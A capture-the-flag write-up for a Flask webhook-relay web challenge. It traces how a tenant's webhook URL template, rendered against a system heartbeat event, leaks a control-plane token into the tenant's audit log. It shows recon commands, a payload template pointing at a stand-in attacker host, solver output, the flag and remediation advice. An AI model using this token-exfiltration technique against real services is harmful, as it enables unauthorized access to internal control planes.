# Crosstalk

## Metadata

| Field | Value |
| --- | --- |
| Category | `web` |
| Difficulty | Hard |
| Points | 100 |
| Solves | 84 |
| First Blood | simown |

## Challenge Description

```text
HookRelay routes your webhook events to whichever endpoints you've subscribed.
You get a regular user account on a shared tenant; the compliance auditors keep
a flag somewhere on the control plane.
```

Target used during validation:

```text
https://fc277307fd1994c6.chal.ctf.ae
```

The archive password was:

```text
infected
```

## Artifacts

The provided archive contains a small Flask service:

```text
public.zip
public/app.py
public/requirements.txt
public/hookrelay/app.py
public/hookrelay/auth.py
public/hookrelay/audit.py
public/hookrelay/config.py
public/hookrelay/control.py
public/hookrelay/dispatch.py
public/hookrelay/events.py
public/hookrelay/jwt_verify.py
public/hookrelay/keys.py
public/hookrelay/legacy.py
public/hookrelay/subscriptions.py
public/hookrelay/templating.py
```

Additional artifacts produced during the solve:

```text
solve_crosstalk.py
assets/01_register.json
assets/02_subscription.json
assets/03_last_audit_poll.json
assets/04_heartbeat_leak.json
assets/05_control_plane.json
```

I did not include browser screenshots for this challenge because the useful
surface is the source code plus JSON API responses. The visual page is not where
the vulnerable state appears; the evidence is the tenant audit record that
contains the rendered callback URL.

## Recon

I started by inspecting the ZIP before making assumptions from the challenge
name:

```bash
zipinfo public.zip
```

Relevant output:

```text
Archive:  public.zip
Zip file size: 11644 bytes, number of entries: 15
app.py
hookrelay/app.py
hookrelay/audit.py
hookrelay/auth.py
hookrelay/config.py
hookrelay/control.py
hookrelay/dispatch.py
hookrelay/events.py
hookrelay/jwt_verify.py
hookrelay/legacy.py
hookrelay/subscriptions.py
hookrelay/templating.py
requirements.txt
```

The application factory in `public/hookrelay/app.py` registers five blueprints:
`auth`, `audit`, `control`, `legacy`, and `subscriptions` (`public/hookrelay/app.py:14` to
`public/hookrelay/app.py:18`). That gave me the first API map:

```text
/api/auth/register
/api/v2/subscriptions
/api/v2/audit/dispatches
/api/v2/admin/control
/graphql
/api/public-key
/api/admin/flag
/api/v1/legacy/search
```

I also checked that the remote behaved like the shipped Flask app. The challenge
certificate was expired when I validated it, so I used `-k` only to ignore TLS
certificate validation:

```bash
curl -k -sS https://fc277307fd1994c6.chal.ctf.ae/health
```

Output:

```text
ok
```

The flag-bearing endpoint was not directly accessible:

```bash
curl -k -sS https://fc277307fd1994c6.chal.ctf.ae/api/v2/admin/control
```

Output:

```json
{"error":"Missing X-Heartbeat-Token header"}
```

At this point the security boundary was clear enough to continue:

```text
normal user JWT -> subscription and audit APIs
internal heartbeat token -> v2 control plane
```

I confirmed the normal-user boundary by registering a user:

```bash
curl -k -sS -X POST \
  https://fc277307fd1994c6.chal.ctf.ae/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"ctk_readme_probe"}'
```

Representative output:

```json
{
  "user_id": "usr_4af37aed26c5",
  "token": "<RS256 user JWT>"
}
```

Then I searched for the important terms that connected the routes to secrets,
rendering, and logs:

```bash
rg -n "FLAG|HEARTBEAT|control|audit|render|url_template|session_nonce|HS256|sqlite" public
```

Relevant hits:

```text
public/hookrelay/config.py:11:HEARTBEAT_TOKEN = secrets.token_hex(24)
public/hookrelay/control.py:17:    if not hmac.compare_digest(token, HEARTBEAT_TOKEN):
public/hookrelay/control.py:20:        "flag": FLAG,
public/hookrelay/events.py:63:                        "continuation_id": HEARTBEAT_TOKEN,
public/hookrelay/audit.py:60:        rendered = render(sub["url_template"], event)
public/hookrelay/audit.py:67:            "rendered_url": rendered,
public/hookrelay/audit.py:72:@bp.route("/api/v2/audit/dispatches", methods=["GET"])
public/hookrelay/subscriptions.py:40:    url_template = body.get("url_template", "")
public/hookrelay/templating.py:26:def render(template: str, ctx) -> str:
public/hookrelay/jwt_verify.py:14:SUPPORTED_ALGORITHMS = ["RS256", "HS256"]
public/hookrelay/legacy.py:191:    nonce = payload.get("session_nonce")
```

This search produced two tracks. The legacy code looked suspicious because the
JWT verifier supports both `RS256` and `HS256`, and the legacy routes expose a
public key. I checked that path first because JWT algorithm confusion is a
common CTF pattern. However, it did not match the final objective:

1. `/api/v2/admin/control` does not read a JWT at all; it only checks
   `X-Heartbeat-Token` (`public/hookrelay/control.py:14` to
   `public/hookrelay/control.py:18`).
2. `/api/admin/flag` is the deprecated v1 endpoint and does not return the real
   flag even after its checks (`public/hookrelay/legacy.py:175` to
   `public/hookrelay/legacy.py:199`).
3. The v1 endpoint also requires a `session_nonce` minted by the GraphQL PIN
   flow (`public/hookrelay/legacy.py:191` to `public/hookrelay/legacy.py:195`),
   so a forged token alone is not a complete path.

The more interesting track was the relationship between the heartbeat token,
webhook URL templates, and the tenant audit log.

## Vulnerability

The vulnerability is sensitive-token exposure through tenant-visible audit
logging. A user-controlled webhook `url_template` is rendered against a
system-internal heartbeat event, and the rendered URL is stored in the same
user's readable audit feed.

The reasoning was not "the token is in the code, therefore solved." I followed
the source-to-sink chain:

1. `public/hookrelay/config.py:11` creates `HEARTBEAT_TOKEN` with
   `secrets.token_hex(24)`.
2. `public/hookrelay/control.py:12` to `public/hookrelay/control.py:20` shows
   that `/api/v2/admin/control` returns the flag only when the request supplies
   that token in `X-Heartbeat-Token`.
3. `public/hookrelay/events.py:54` to `public/hookrelay/events.py:72` builds a
   `system.heartbeat` event every 60 seconds and places the same token at
   `actor.context.continuation_id`.
4. `public/hookrelay/subscriptions.py:32` to `public/hookrelay/subscriptions.py:70`
   lets any normal user create a subscription with an arbitrary HTTPS
   `url_template`.
5. `public/hookrelay/templating.py:9` and `public/hookrelay/templating.py:26`
   show that templates can read dotted paths from the event context, such as
   `{{actor.context.continuation_id}}`.
6. `public/hookrelay/audit.py:51` to `public/hookrelay/audit.py:69` renders each
   subscription's `url_template` against the system event and stores the
   resulting `rendered_url`.
7. `public/hookrelay/audit.py:72` to `public/hookrelay/audit.py:79` exposes the
   logged dispatches back to the subscription owner.

The key design mistake is that `record_system_broadcast()` treats a privileged
system event as safe input to a tenant-controlled template, then stores the
rendered result in a tenant-readable log. That breaks the intended boundary:
normal users should be able to audit platform health events, but they should
not be able to project internal control-plane tokens into their own logs.

This matches a well-known class of issues. CWE-532 covers writing sensitive
information into logs, and OWASP's Logging Cheat Sheet explicitly warns that
access tokens, encryption keys, and primary secrets should not be recorded
directly in logs. The twist in this challenge is that the secret is not logged
by a normal `logger.info()` call; it is copied into the log through webhook
template rendering.

## Exploitation

The exploit chain is:

1. Register a normal user and receive a user JWT.
2. Create a subscription whose `url_template` contains
   `{{actor.context.continuation_id}}`.
3. Wait for the next `system.heartbeat` event.
4. Read `/api/v2/audit/dispatches` as the same user.
5. Extract the 48-hex-character heartbeat token from `rendered_url`.
6. Replay it to `/api/v2/admin/control` as `X-Heartbeat-Token`.

The malicious subscription is valid because the server only enforces that the
callback starts with `https://` and that the filter is one of the allowed values:

```json
{
  "name": "heartbeat-leak",
  "url_template": "https://attacker.invalid/hb/{{actor.context.continuation_id}}",
  "filter": "user.*"
}
```

The `filter` value does not need to match `system.heartbeat`. That is an
important detail: normal dispatches are filtered in `public/hookrelay/dispatch.py`,
but `record_system_broadcast()` intentionally iterates all subscriptions for SLA
auditability, regardless of the subscription filter.

I used the final solver like this:

```bash
python3 solve_crosstalk.py --insecure --evidence-dir assets \
  https://fc277307fd1994c6.chal.ctf.ae
```

Output:

```text
[+] Registering normal user: ctk_1783383062_8yqni5za
[+] Creating subscription with a URL template that references the event context
[+] Polling tenant audit log until a system.heartbeat row is rendered
[+] Leaked heartbeat token: fb6de08af8dc20842150be3175bbbbe05b2b08e2c1260d1e
[+] Calling the control-plane endpoint with X-Heartbeat-Token
{
  "endpoint": "control_plane",
  "flag": "flag{5ce5a5149e5e4dca}",
  "version": "v2"
}
```

The created subscription evidence is saved in `assets/02_subscription.json`:

```json
{
  "created_at": 1783383063,
  "filter": "user.*",
  "id": "sub_7e02ad14928f",
  "name": "heartbeat-leak",
  "url_template": "https://attacker.invalid/hb/{{actor.context.continuation_id}}"
}
```

The audit leak is saved in `assets/04_heartbeat_leak.json`:

```json
{
  "event_type": "system.heartbeat",
  "owner": "usr_2377b26bc87f",
  "rendered_url": "https://attacker.invalid/hb/fb6de08af8dc20842150be3175bbbbe05b2b08e2c1260d1e",
  "status": "system_broadcast",
  "subscription_id": "sub_7e02ad14928f",
  "subscription_name": "heartbeat-leak",
  "timestamp": 1783383108.9736044
}
```

The final control-plane response is saved in `assets/05_control_plane.json`:

```json
{
  "endpoint": "control_plane",
  "flag": "flag{5ce5a5149e5e4dca}",
  "version": "v2"
}
```

## Technical Details

The custom template engine is intentionally simple:

```python
_TOKEN = re.compile(r"\{\{\s*([A-Za-z0-9_.]+)\s*\}\}")

def render(template: str, ctx) -> str:
    return _TOKEN.sub(lambda m: _resolve(m.group(1), ctx), template)
```

It only resolves dotted paths; this is not server-side template injection with
code execution. The exploit works because the renderer is given a sensitive
context object.

For a normal synthetic user event, this template:

```text
https://attacker.invalid/hb/{{actor.context.continuation_id}}
```

would render as:

```text
https://attacker.invalid/hb/
```

because normal events do not contain `actor.context.continuation_id`. For the
heartbeat event, the context contains:

```json
{
  "type": "system.heartbeat",
  "actor": {
    "role": "system",
    "context": {
      "continuation_id": "<HEARTBEAT_TOKEN>"
    }
  }
}
```

so the same template becomes:

```text
https://attacker.invalid/hb/<HEARTBEAT_TOKEN>
```

The exploit does not depend on outbound HTTP delivery. `public/hookrelay/dispatch.py`
states that outbound delivery is disabled in the CTF sandbox and that the audit
row is the canonical dispatch record. That is why reading the audit log is
enough.

The bug can be fixed at several layers:

1. Do not include `HEARTBEAT_TOKEN` in tenant-auditable event objects.
2. Do not render tenant-controlled templates against privileged system events.
3. Store an unrendered or redacted callback reference in audit logs for system
   broadcasts.
4. Treat tokens and control-plane material as non-loggable secrets.

## Exploit Artifact

`solve_crosstalk.py` is a dependency-free Python script using only the standard
library. It implements the exact chain:

```text
register user
create malicious subscription
poll audit log
extract token from rendered_url
call control plane with X-Heartbeat-Token
save JSON evidence
```

Usage:

```bash
python3 solve_crosstalk.py --insecure --evidence-dir assets \
  https://fc277307fd1994c6.chal.ctf.ae
```

If the certificate is valid in the review environment, remove `--insecure`.

## Validation

Script syntax check:

```bash
python3 -m py_compile solve_crosstalk.py
```

Remote exploit validation:

```bash
python3 solve_crosstalk.py --insecure --evidence-dir assets \
  https://fc277307fd1994c6.chal.ctf.ae
```

Result:

```text
flag{5ce5a5149e5e4dca}
```

Evidence files were written under `assets/`:

```text
01_register.json
02_subscription.json
03_last_audit_poll.json
04_heartbeat_leak.json
05_control_plane.json
```

## References

- <https://cwe.mitre.org/data/definitions/532.html>
- <https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html>
- <https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README>

## Flag

```text
flag{5ce5a5149e5e4dca}
```
